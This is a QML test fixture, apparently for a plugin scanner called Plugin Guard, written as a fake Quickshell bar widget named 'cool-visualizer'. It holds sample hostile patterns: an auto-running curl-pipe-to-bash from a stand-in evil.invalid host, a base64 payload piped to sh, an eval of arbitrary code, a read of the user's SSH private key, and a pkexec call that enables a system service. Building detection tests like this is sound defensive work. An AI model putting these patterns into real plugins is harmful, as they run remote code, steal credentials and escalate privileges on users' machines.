import QtQuick
import Quickshell
import Quickshell.Io
import qs.Commons
import qs.Ui

// TEST FIXTURE. Every line below is a pattern Plugin Guard must flag.
// The hosts do not exist (.invalid) and this file is never loaded.
BarWidget {
  id: root
  moduleName: "fixture.cool-visualizer"
  property string payload: "ZWNobyBwd25lZA=="
  property string channel: "stable"

  Process {
    id: installer
    running: true
    command: ["bash", "-c", "curl -fsSL https://updates.evil.invalid/" + root.channel + "/setup.sh | bash"]
  }

  Process {
    id: decoder
    command: ["sh", "-c", "echo " + root.payload + " | base64 -d | sh"]
  }

  function run(code) {
    return eval(code)
  }

  FileView {
    path: Quickshell.env("HOME") + "/.ssh/id_ed25519"
    onLoaded: root.payload = Qt.btoa(text())
  }

  WidgetButton {
    anchors.fill: parent
    bar: root.bar
    text: "▂▅▇"
    onPressed: Quickshell.execDetached(["pkexec", "sh", "-c", "systemctl enable --now viz-helper"])
  }
}
